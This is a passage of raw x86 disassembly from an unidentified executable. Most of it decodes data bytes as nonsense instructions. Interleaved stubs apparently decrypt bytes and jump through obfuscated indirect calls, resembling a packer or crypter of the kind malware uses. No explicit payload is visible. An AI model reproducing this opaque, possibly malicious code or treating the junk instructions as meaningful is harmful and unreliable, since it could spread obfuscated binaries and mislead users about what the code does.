  4072f5:	push   edx
  4072f6:	jb     0x40736f
  4072f8:	mov    edi,0x7dbb097a
  4072fd:	xlat   BYTE PTR ds:[ebx]
  4072fe:	ins    DWORD PTR es:[edi],dx
  4072ff:	outs   dx,DWORD PTR ds:[esi]
  407300:	(bad)  
  407301:	ds xchg ecx,eax
  407303:	fdiv   QWORD PTR [ebx+0x4cebccbf]
  407309:	scas   eax,DWORD PTR es:[edi]
  40730a:	mov    WORD PTR [edi-0x78],fs
  40730d:	cmp    al,0x88
  40730f:	jnp    0x4072fb
  407311:	and    DWORD PTR [ecx+0x116528b8],eax
  407317:	das    
  407318:	xor    al,0xaf
  40731a:	fadd   st(7),st
  40731c:	mov    ds:0x24f15b2a,al
  407321:	push   edx
  407322:	retf   
  407323:	inc    ecx
  407324:	int3   
  407325:	add    BYTE PTR [ebx],dl
  407327:	mov    esp,0x3240cecc
  40732c:	add    dh,BYTE PTR [ecx]
  40732e:	or     BYTE PTR [ebp-0x4479798c],cl
  407334:	inc    ecx
  407335:	mov    eax,0x45ad67e
  40733a:	sbb    eax,0x22a1f1a9
  40733f:	cdq    
  407340:	pop    esp
  407341:	and    dl,BYTE PTR [ebp+0x7f]
  407344:	sub    BYTE PTR [edi-0x79f29c5],cl
  40734a:	out    0xdd,al
  40734c:	stos   DWORD PTR es:[edi],eax
  40734d:	push   esi
  40734e:	mov    al,ds:0xc12ebc74
  407353:	jmp    0x6b01fc09
  407358:	cmp    ecx,DWORD PTR [edi]
  40735a:	out    dx,al
  40735b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40735c:	mov    cl,0xa2
  40735e:	push   ds
  40735f:	ror    DWORD PTR [ebx+0x4fa8fe49],1
  407365:	nop
  407366:	pop    esi
  407367:	mov    ebp,0xbd2f903a
  40736c:	sahf   
  40736d:	dec    edx
  40736e:	js     0x40737a
  407370:	cwde   
  407371:	test   BYTE PTR [ebx],dl
  407373:	pop    edx
  407374:	inc    esi
  407375:	jl     0x407332
  407377:	dec    esp
  407378:	adc    ebx,DWORD PTR [edi]
  40737a:	ja     0x40734b
  40737c:	cdq    
  40737d:	add    al,0xce
  40737f:	hlt    
  407380:	xchg   ebx,eax
  407381:	adc    al,0xf5
  407383:	fwait
  407384:	lock pop esi
  407386:	jecxz  0x4073dc
  407388:	xor    DWORD PTR [edi],esp
  40738a:	push   eax
  40738b:	es or  al,dh
  40738e:	aas    
  40738f:	jge    0x40731c
  407391:	sbb    BYTE PTR [eax-0xffffff],0x30
  407398:	call   0x40d076
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	aad    0x64
  4073e1:	cmp    ebp,ecx
  4073e3:	stos   DWORD PTR es:[edi],eax
  4073e4:	shl    DWORD PTR [eax+0x70],0x20
  4073e8:	jge    0x40745a
  4073ea:	jo     0x407466
  4073ec:	retf   
  4073ed:	mov    esp,0x74b474d4
  4073f2:	es scas al,BYTE PTR es:[edi]
  4073f4:	adc    al,0x96
  4073f6:	and    al,0x5
  4073f8:	adc    DWORD PTR [ebx],0xb7d2b32e
  4073fe:	jmp    0x40744f
  407400:	push   esp
  407401:	sbb    al,0xfb
  407403:	push   ecx
  407404:	pop    edx
  407405:	add    BYTE PTR [eax-0xa],cl
  407408:	in     eax,dx
  407409:	es stos DWORD PTR es:[edi],eax
  40740b:	sahf   
  40740c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40740d:	lds    esi,FWORD PTR [ebx]
  40740f:	mov    ebx,0xebec105a
  407414:	mov    ds:0x6c8e1978,eax
  407419:	jmp    0xf260:0x339b56e4
  407420:	sar    esi,0xf
  407423:	fstp   QWORD PTR [ebx]
  407425:	fidivr WORD PTR [ebx+0x55]
  407428:	mov    bh,0x21
  40742a:	enter  0x2de6,0x8d
  40742e:	out    dx,eax
  40742f:	mov    ah,0xd5
  407431:	pop    edi
  407432:	out    0xa2,al
  407434:	ins    BYTE PTR es:[edi],dx
  407435:	gs adc al,0x40
  407438:	stos   DWORD PTR es:[edi],eax
  407439:	mov    al,ds:0xdaa91cf1
  40743e:	je     0x407492
  407440:	cmp    ecx,DWORD PTR [esi-0x64d3b085]
  407446:	mov    ebp,0x82e824e3
  40744b:	or     cl,ch
  40744d:	ins    DWORD PTR es:[edi],dx
  40744e:	mov    WORD PTR [eax-0x75],?
  407451:	sbb    al,0x4d
  407453:	gs ja  0x40745a
  407456:	add    BYTE PTR [eax-0x25],dh
  407459:	mov    BYTE PTR [edi+0x37],al
  40745c:	mov    bx,0xc4d0
  407460:	mov    BYTE PTR [ebx+0x5],dh
  407463:	mov    dl,0xb0
  407465:	mov    edx,0x2c098b39
  40746a:	fdivr  QWORD PTR [eax]
  40746c:	loop   0x407488
  40746e:	test   eax,0xd44399e5
  407473:	in     eax,dx
  407474:	fucomi st,st(7)
  407476:	xlat   BYTE PTR ds:[ebx]
  407477:	arpl   WORD PTR ds:0xd28dba55,dx
  40747d:	ret    0xd055
  407480:	and    al,0xa4
  407482:	mov    dh,BYTE PTR [ebp-0x3c19ffa]
  407488:	add    al,BYTE PTR [eax]
  40748a:	mov    BYTE PTR [ebx],bl
  40748c:	add    eax,0xa938f80d
  407491:	ret    0x269d
  407494:	shr    BYTE PTR [ebp-0x22465787],0xd5
  40749b:	imul   esi
  40749d:	and    esp,edx
  40749f:	xchg   BYTE PTR [edx+0x62],ch
  4074a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a3:	jno    0x40749d
  4074a5:	cli    
  4074a6:	pop    esi
  4074a7:	shl    BYTE PTR [esi],1
  4074a9:	out    dx,al
  4074aa:	loope  0x407482
  4074ac:	adc    al,0xeb
  4074ae:	in     al,0x7
  4074b0:	es int3 
  4074b2:	pop    ebx
  4074b3:	test   al,0x90
  4074b5:	push   esi
  4074b6:	mov    edx,0x28880c9b
  4074bb:	jb     0x407514
  4074bd:	push   eax
  4074be:	jg     0x40745e
  4074c0:	ss xchg esi,eax
  4074c2:	fsub   DWORD PTR [edi]
  4074c4:	(bad)  
  4074c5:	int3   
  4074c6:	push   ecx
  4074c7:	ins    DWORD PTR es:[edi],dx
  4074c8:	lds    eax,FWORD PTR [esi+0x5057d9eb]
  4074ce:	aad    0xfc
  4074d0:	mov    dl,0x5f
  4074d2:	dec    ecx
  4074d3:	lahf   
  4074d4:	lock cmp eax,DWORD PTR [edx-0x9d05e98]
  4074db:	in     eax,dx
  4074dc:	int3   
  4074dd:	sbb    al,BYTE PTR [edi+0x2cfcd88c]
  4074e3:	push   esp
  4074e4:	stos   BYTE PTR es:[edi],al
  4074e5:	imul   ebp,DWORD PTR [esi-0x284250ef],0x4323fe58
  4074ef:	xor    ebp,ebp
  4074f1:	mov    ebp,0xc157bb9b
  4074f6:	aad    0x36
  4074f8:	dec    esi
  4074f9:	fwait
  4074fa:	out    dx,eax
  4074fb:	adc    edi,ebx
  4074fd:	push   edi
  4074fe:	mov    edx,0x89f885b6
  407503:	mov    cl,BYTE PTR [edx+0x30b9626e]
  407509:	ins    DWORD PTR es:[edi],dx
  40750a:	(bad)
  40750d:	pushf  
  40750e:	idiv   DWORD PTR [ecx+edi*8+0x4a8b8bbc]
  407515:	sar    ebp,1
  407517:	jge    0x40749d
  407519:	add    al,BYTE PTR [edx+0x1eb6576]
  40751f:	mov    edx,0x357792bc
  407524:	push   es
  407525:	mov    esi,0x706e3962
  40752a:	ins    BYTE PTR es:[edi],dx
  40752b:	push   ebx
  40752c:	add    cl,bh
  40752e:	jle    0x40753e
  407530:	xchg   esp,eax
  407531:	mov    ebp,0xd54a8ef
  407536:	mov    ecx,0x7aacc434
  40753c:	mov    DWORD PTR [eax],eax
  40753e:	in     eax,dx
  40753f:	imul   esi,DWORD PTR [edi+0x61],0xc1b3078d
  407546:	rcl    DWORD PTR [edi-0x15],cl
  407549:	imul   ebp,DWORD PTR [esi+0x55cc4e26],0x88f960dd
  407553:	stos   BYTE PTR es:[edi],al
  407554:	jne    0x4075c8
  407556:	mov    edi,gs
  407558:	fld    TBYTE PTR [edx-0x45]
  40755b:	dec    ebx
  40755c:	pop    eax
  40755d:	jbe    0x4074e6
  40755f:	repnz call 0x5893:0xad76c83a
  407567:	clc    
  407568:	push   ebx
  407569:	fnstenv [edi]
  40756b:	fld    TBYTE PTR [ebp-0x3b58e44f]
  407571:	cmp    DWORD PTR [edi+0x2f71f59],edi
  407577:	pop    esp
  407578:	shl    esp,1
  40757a:	jmp    0x8d37:0xb7bcc4f1
  407581:	(bad)  
  407582:	scas   eax,DWORD PTR es:[edi]
  407583:	out    0x12,eax
  407585:	push   eax
  407586:	popa   
  407587:	pop    eax
  407588:	mov    ds:0xe8ccddf,al
  40758d:	cmp    eax,DWORD PTR [eax+0x2]
  407590:	iret   
  407591:	jnp    0x407555
  407593:	inc    edx
  407594:	cmp    BYTE PTR [ecx+0x20c5adff],dh
  40759a:	sbb    al,0xb
  40759c:	sbb    ch,dl
  40759e:	cmc    
  40759f:	lods   al,BYTE PTR ds:[esi]
  4075a0:	imul   edx,DWORD PTR [ecx],0x6dcc164f
  4075a6:	test   eax,0xe6df5840
  4075ab:	je     0x4075d7
  4075ad:	ins    DWORD PTR es:[edi],dx
  4075ae:	repz and ecx,DWORD PTR [eax+0x70]
  4075b2:	push   es
  4075b3:	nop
  4075b4:	jmp    0xb71c:0xe0819b1b
  4075bb:	push   esi
  4075bc:	xchg   edi,eax
  4075bd:	aad    0x62
  4075bf:	jg     0x40758a
  4075c1:	or     bh,al
  4075c3:	dec    edi
  4075c4:	je     0x40758c
  4075c6:	xchg   DWORD PTR [esi+edx*4-0x33],eax
  4075ca:	and    al,BYTE PTR [esi+0x6d]
  4075cd:	jecxz  0x40758b
  4075cf:	sub    esp,edi
  4075d1:	pop    esp
  4075d2:	pop    ebp
  4075d3:	fisubr WORD PTR [eax]
  4075d5:	fbld   TBYTE PTR [esi+0x3b]
  4075d8:	and    ecx,0x91c35412
  4075de:	sub    al,0x28
  4075e0:	push   edi
  4075e1:	xchg   BYTE PTR [ebx+0x69],ah
  4075e4:	test   DWORD PTR [ebx+0x5de12a2f],0xfb74194
  4075ee:	fbld   TBYTE PTR [esi-0x35cd594c]
  4075f4:	inc    ebp
  4075f5:	pop    es
  4075f6:	xor    bh,BYTE PTR [ebp-0x50]
  4075f9:	scas   al,BYTE PTR es:[edi]
  4075fa:	mov    edx,0xf92a9350
  4075ff:	cwde   
  407600:	lds    ebp,FWORD PTR [ebp-0xc]
  407603:	daa    
  407604:	out    dx,al
  407605:	shl    DWORD PTR [ebp+eiz*2+0x4ef6938a],cl
  40760c:	jmp    0x66817f08
  407611:	mov    eax,0xf2b2b520
  407616:	outs   dx,DWORD PTR ds:[esi]
  407617:	adc    ah,BYTE PTR [eax]
  407619:	sbb    al,0x78
  40761b:	add    al,0x69
  40761d:	test   BYTE PTR [ebp-0x416e5aa2],bh
  407623:	ror    BYTE PTR [eax],cl
  407625:	xchg   BYTE PTR [ebx+0x11c0287],cl
  40762b:	or     eax,0x20b1d08e
  407630:	or     ebx,DWORD PTR [ebp-0x4b]
  407633:	cld    
  407634:	arpl   WORD PTR [edi+edx*8-0x51],sp
  407638:	jecxz  0x407682
  40763a:	rcr    DWORD PTR [esi-0x1a586452],0x24
  407641:	xchg   edx,eax
  407642:	jmp    0xc595dd41
  407647:	in     al,dx
  407648:	push   edx
  407649:	dec    ebx
  40764a:	dec    eax
  40764b:	cmp    BYTE PTR [eax+edi*4-0x67],bl
  40764f:	and    al,0xeb
  407651:	lea    edx,[esi-0x1a933ecf]
  407657:	jl     0x407654
  407659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40765a:	and    dl,BYTE PTR [ebp+0x3d]
  40765d:	xor    eax,0x4d33e461
  407662:	int3   
  407663:	mov    al,0xdc
  407665:	cmp    edi,DWORD PTR [ebx+ecx*8+0x4a]
  407669:	popa   
  40766a:	xchg   esi,esi
  40766c:	in     al,dx
  40766d:	shl    DWORD PTR [eax],0x67
  407670:	test   BYTE PTR [ebx],0x56
  407673:	dec    ecx
  407674:	popa   
  407675:	repz test DWORD PTR [esi+0x469a0f6e],edx
  40767c:	xchg   ecx,eax
  40767d:	lahf   
  40767e:	aas    
  40767f:	cdq    
  407680:	daa    
  407681:	js     0x4076bb
  407683:	mov    bl,0x66
  407685:	ret    
  407686:	aad    0xa
  407688:	(bad)  
  407689:	out    0xb6,al
  40768b:	cmp    al,0x8e
  40768d:	pop    ds
  40768e:	sbb    edx,ebp
  407690:	mov    DWORD PTR [edi-0x769c8ab9],edi
  407696:	fwait
  407697:	push   eax
  407698:	mov    ds:0x26a94551,al
  40769d:	popf   
  40769e:	aas    
  40769f:	dec    esi
  4076a0:	stos   BYTE PTR es:[edi],al
  4076a1:	xor    ah,ch
  4076a3:	fcom   DWORD PTR [edi-0xe]
  4076a6:	aad    0xc1
  4076a8:	fadd   QWORD PTR [esi]
  4076aa:	xor    al,0x7b
  4076ac:	int    0xbc
  4076ae:	jmp    0x8fa0:0xa32325ee
  4076b5:	dec    ecx
  4076b6:	sbb    ecx,ebx
  4076b8:	pop    ecx
  4076b9:	mov    al,0x11
  4076bb:	pop    ebx
  4076bc:	jnp    0x40767f
  4076be:	and    DWORD PTR [esi],esp
  4076c0:	adc    cl,bl
  4076c2:	leave  
  4076c3:	mov    ch,0xab
  4076c5:	mov    es,WORD PTR [edx+0xb7211f7]
  4076cb:	lahf   
  4076cc:	xchg   ebx,eax
  4076cd:	ins    BYTE PTR es:[edi],dx
  4076ce:	and    ah,al
  4076d0:	ja     0x4076b7
  4076d2:	ins    DWORD PTR es:[edi],dx
  4076d3:	dec    edi
  4076d4:	jg     0x4076c6
  4076d6:	cmp    eax,0x808ee8e4
  4076db:	adc    eax,0xa4b97471
  4076e0:	fneni(8087 only) 
  4076e2:	adc    ch,BYTE PTR [eax-0x652c43e8]
  4076e8:	les    edi,FWORD PTR [ecx+0x6a158080]
  4076ee:	lods   eax,DWORD PTR ds:[esi]
  4076ef:	mov    al,0x32
  4076f1:	outs   dx,BYTE PTR ds:[esi]
  4076f2:	jnp    0x407674
  4076f4:	(bad)  
  4076f5:	xor    esi,edi
  4076f7:	scas   al,BYTE PTR es:[edi]
  4076f8:	fcomip st,st(3)
  4076fa:	and    eax,0x76e12a4d
  4076ff:	push   ss
  407700:	pop    eax
  407701:	in     eax,0x73
  407703:	sub    edi,DWORD PTR [edi+eax*1+0x2f]
  407707:	xchg   ebp,eax
  407708:	cmp    BYTE PTR [ebx-0x10],0x69
  40770c:	sbb    al,0x49
  40770e:	test   al,0xc7
  407710:	push   ebx
  407711:	adc    eax,DWORD PTR [esi]
  407713:	sub    BYTE PTR [edx],0xc6
  407716:	test   DWORD PTR [ecx-0x1bd25d7],edx
  40771c:	or     bh,bh
  40771e:	jne    0x407710
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434499,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432ee4
  40777b:	mov    edi,DWORD PTR ds:0x4344c9
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432e66,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x4343e6
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x43276c,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x43276c
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x43276c,edi
  4077c2:	cmp    DWORD PTR ds:0x43276c,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x4344a1
  4077dc:	call   DWORD PTR ds:0x432a4a
  4077e2:	cmp    DWORD PTR ds:0x43276c,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x43276c
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x43276c,edi
  4077fe:	cmp    DWORD PTR ds:0x43276c,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432e5e,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x4343ee
  40782a:	or     DWORD PTR ds:0x43277c,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434495,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432780,0x434412
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x43276c
  407850:	or     edi,DWORD PTR ds:0x432770
  407856:	mov    DWORD PTR ds:0x43276c,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x4344a5,0x1e
  407871:	cmp    DWORD PTR ds:0x4344a5,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x4344a5,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432d76
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x4344a5
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x4344a5,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x434426
  4078ab:	mov    edi,DWORD PTR ds:0x4344e9
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	ret    0x8841
  4078ca:	inc    ebx
  4078cb:	pop    ebx
  4078cc:	into   
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x5ba26370
  4078d6:	int3   
  4078d7:	inc    esi
  4078d8:	jecxz  0x40790e
  4078da:	sub    BYTE PTR [ecx+0x17],dh
  4078dd:	cwde   
  4078de:	jns    0x407922
  4078e0:	mov    bh,0x2b
  4078e2:	inc    esi
  4078e3:	jle    0x407934
  4078e5:	mov    eax,ds:0x504a133b
  4078ea:	scas   eax,DWORD PTR es:[edi]
  4078eb:	inc    esp
  4078ec:	cmp    ebp,esi
  4078ee:	push   0xc8794951
  4078f3:	mov    bl,0x3e
  4078f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f6:	xchg   edi,eax
  4078f7:	sbb    al,ah
  4078f9:	jle    0x40791c
  4078fb:	js     0x4078c9
  4078fd:	cmp    BYTE PTR [ecx-0x8e8b77a],al
  407903:	popa   
  407904:	adc    BYTE PTR [edx],0x80
  407907:	(bad)  
  407908:	push   ecx
  407909:	inc    ebp
  40790a:	cmp    esi,DWORD PTR [bp+0x4314]
  40790f:	je     0x40795a
  407911:	push   edx
  407912:	sbb    ch,BYTE PTR [esi+0x732d3d44]
  407918:	retf   
  407919:	mov    ebx,0xe422f5c8
  40791e:	and    BYTE PTR [edi],bl
  407920:	xchg   ebp,eax
  407921:	mov    dl,0x4
  407923:	mov    bl,bh
  407925:	cmp    dh,BYTE PTR [edi-0x16]
  407928:	lods   eax,DWORD PTR ds:[esi]
  407929:	aad    0x9d
  40792b:	fimul  WORD PTR [edx-0x7d3221c7]
  407931:	jg     0x4079ae
  407933:	xor    BYTE PTR [ecx-0x47],cl
  407936:	mov    esi,0x36cb21c0
  40793b:	sub    BYTE PTR [ebx],0xfe
  40793e:	pop    eax
  40793f:	lahf   
  407940:	push   edi
  407941:	mov    ecx,0x1b64c52b
  407946:	pop    ebx
  407947:	gs ins BYTE PTR es:[edi],dx
  407949:	or     cl,0xee
  40794c:	(bad)  
  40794d:	loope  0x40798a
  40794f:	mov    ds:0x91fe3874,eax
  407954:	or     eax,0xfa7f98bf
  407959:	cmp    ebp,DWORD PTR [edx]
  40795b:	cmp    BYTE PTR [edx-0x62191f6b],bh
  407961:	pop    eax
  407962:	cmp    al,0xf2
  407964:	repnz enter 0xbf34,0xfa
  407969:	scas   al,BYTE PTR es:[edi]
  40796a:	(bad)  
  40796b:	aad    0x80
  40796d:	rcl    BYTE PTR [esp+ebp*1-0x529cff2c],0xa8
  407975:	xchg   ebp,eax
  407976:	mov    al,0x11
  407978:	std    
  407979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40797a:	fs pop eax
  40797c:	and    DWORD PTR [ebx*2-0x522beea0],0xff86b6b4
  407987:	ins    BYTE PTR es:[edi],dx
  407988:	mov    edi,0xaef7d57f
  40798d:	rcr    esi,cl
  40798f:	add    eax,0x6ec6bdd3
  407994:	push   ecx
  407995:	adc    eax,0x2d3fe7df
  40799a:	xchg   ebp,eax
  40799b:	jno    0x4079e4
  40799d:	jge    0x407990
  40799f:	adc    esp,DWORD PTR [edi-0x54fc0122]
  4079a5:	aad    0xf6
  4079a7:	mov    eax,0xa865f990
  4079ac:	in     eax,dx
  4079ad:	jno    0x407930
  4079af:	mov    eax,0x5e85a31d
  4079b4:	push   es
  4079b5:	mov    edx,edi
  4079b7:	or     al,0x61
  4079b9:	outs   dx,DWORD PTR ds:[esi]
  4079ba:	and    BYTE PTR [esi-0xc3d2fcb],0x23
  4079c1:	sti    
  4079c2:	push   ebp
  4079c3:	std    
  4079c4:	dec    esi
  4079c5:	or     ch,ch
  4079c7:	scas   al,BYTE PTR es:[edi]
  4079c8:	add    ebx,ecx
  4079ca:	add    al,0xcb
  4079cc:	outs   dx,BYTE PTR ds:[esi]
  4079cd:	lods   eax,DWORD PTR ds:[esi]
  4079ce:	cmp    ebx,esp
  4079d0:	or     eax,0xa61e92f5
  4079d5:	les    edx,FWORD PTR [edx-0x5]
  4079d8:	pop    edx
  4079d9:	adc    BYTE PTR [ebp+0x5e5d4762],al
  4079df:	sbb    eax,0x2ef819b8
  4079e4:	out    dx,al
  4079e5:	test   ah,al
  4079e7:	cmp    DWORD PTR [ecx+ebx*8+0x3c],0xfdb59a3e
  4079ef:	scas   eax,DWORD PTR es:[edi]
  4079f0:	retf   0x428
  4079f3:	jmp    0x26dc:0x89874a49
  4079fa:	cmc    
  4079fb:	(bad)  
  4079fc:	jmp    0x2c78:0x9d0b0970
  407a03:	icebp  
  407a04:	jl     0x407a5d
  407a06:	sti    
  407a07:	std    
  407a08:	sbb    edx,esp
  407a0a:	in     eax,0xea
  407a0c:	(bad)  [edx+0x530ac1c6]
  407a12:	or     ecx,DWORD PTR [esi-0x62a00ea9]
  407a18:	call   0xcdfb812e
  407a1d:	adc    DWORD PTR [edi+0x44],edi
  407a20:	nop
  407a21:	aad    0x6e
  407a23:	fdiv   st,st(2)
  407a25:	outs   dx,BYTE PTR ds:[esi]
  407a26:	fdivr  QWORD PTR [edx+0x75410b87]
  407a2c:	jge    0x407a57
  407a2e:	shl    BYTE PTR [eax+ecx*2-0x71],1
  407a32:	cdq    
  407a33:	sub    al,cl
  407a35:	aas    
  407a36:	int    0x68
  407a38:	std    
  407a39:	call   DWORD PTR [edx+0xf4b5078]
  407a3f:	in     al,dx
  407a40:	mov    al,0xaf
  407a42:	or     cl,BYTE PTR [edx-0x1e]
  407a45:	fbstp  TBYTE PTR [ebx+0x3e]
  407a48:	cmp    dl,dl
  407a4a:	ins    BYTE PTR es:[edi],dx
  407a4b:	xchg   ecx,edx
  407a4d:	test   BYTE PTR [eax],dl
  407a4f:	xchg   ebx,eax
  407a50:	enter  0xcd46,0x64
  407a54:	or     eax,0xb8e026d7
  407a59:	jno    0x407a46
  407a5b:	push   ss
  407a5c:	adc    eax,0x6e968230
  407a61:	mov    ecx,gs
  407a63:	fisttp WORD PTR [edx+0x45]
  407a66:	xchg   ebx,eax
  407a67:	std    
  407a68:	cmp    esp,DWORD PTR [ebx]
  407a6a:	or     al,bh
  407a6c:	mov    BYTE PTR [edi+0x6051c0ab],dl
  407a72:	cmp    cl,BYTE PTR [eax+0x22]
  407a75:	inc    ebx
  407a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a77:	rcl    BYTE PTR [esi-0x9579b98],0xf7
  407a7e:	xchg   edi,eax
  407a7f:	hlt    
  407a80:	scas   eax,DWORD PTR es:[edi]
  407a81:	jo     0x407ab4
  407a83:	jo     0x407add
  407a85:	lds    edi,FWORD PTR [edi-0x43493508]
  407a8b:	das    
  407a8c:	jecxz  0x407a0e
  407a8e:	pop    ss
  407a8f:	and    eax,0x5f585b3f
  407a94:	and    edi,DWORD PTR [esp+0x5e4a581c]
  407a9b:	cmc    
  407a9c:	xchg   esp,eax
  407a9d:	in     eax,0xb2
  407a9f:	fldcw  WORD PTR [edi-0x47ad85db]
  407aa5:	push   esp
  407aa6:	push   ss
  407aa7:	std    
  407aa8:	pop    ebx
  407aa9:	jg     0x407a70
  407aab:	out    0x1e,eax
  407aad:	cmp    eax,DWORD PTR [ecx+0x64453da1]
  407ab3:	push   esp
  407ab4:	(bad)  
  407ab5:	mov    eax,ds:0x44271f4d
  407aba:	jl     0x407aad
  407abc:	(bad)  
  407abd:	mov    ebp,0x1b21e023
  407ac2:	enter  0x959e,0xc0
  407ac6:	ja     0x407b0e
  407ac8:	pusha  
  407ac9:	push   ss
  407aca:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  407ad1:	add    edx,DWORD PTR ds:0x432e4e
  407ad7:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  407ade:	mov    edi,DWORD PTR ds:0x4343ea
  407ae4:	sub    DWORD PTR ds:0x4343f2,edi
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x4344a5,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi-0x3ed14807]
  407b18:	enter  0x5423,0xcc
  407b1c:	jo     0x407b8e
  407b1e:	imul   edi,DWORD PTR [edi+0x70],0xe972e370
  407b25:	shl    DWORD PTR [edx+0x24],cl
  407b28:	jo     0x407b6f
  407b2a:	(bad)  
  407b2b:	sbb    DWORD PTR [ebx],esp
  407b2d:	push   edi
  407b2e:	bswap  edx
  407b30:	mov    ecx,DWORD PTR [edi-0x3e]
  407b33:	leave  
  407b34:	pop    esp
  407b35:	mov    ecx,0x45114855
  407b3a:	shl    DWORD PTR [ebx+ebp*4],1
  407b3d:	sbb    edx,ebp
  407b3f:	ss sahf 
  407b41:	push   0x781eca9b
  407b46:	lahf   
  407b47:	sbb    al,0xa0
  407b49:	jne    0x407b72
  407b4b:	jmp    0x407ba1
  407b4d:	cmc    
  407b4e:	jne    0x407ad4
  407b50:	hlt    
  407b51:	mov    ds:0x7993f1e7,al
  407b56:	fisubr WORD PTR [ebx-0x21167a0d]
  407b5c:	iret   
  407b5d:	ja     0x407bc1
  407b5f:	jmp    0x93575ea4
  407b64:	cmp    al,0xdb
